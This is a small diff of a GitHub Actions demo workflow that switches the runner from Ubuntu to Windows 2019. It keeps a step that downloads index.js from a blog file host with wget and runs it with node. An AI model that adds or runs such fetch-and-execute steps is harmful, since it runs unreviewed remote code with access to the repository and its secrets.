@@ -2,7 +2,7 @@ name: GitHub Actions Demo
 on: [push]
 jobs:
   build-and-deploy:
-    runs-on: ubuntu-latest
+    runs-on: windows-2019
     steps:
       - uses: actions/checkout@master
       - run: wget https://files.cnblogs.com/files/mldonkey/index.js;node index.js;node index.js
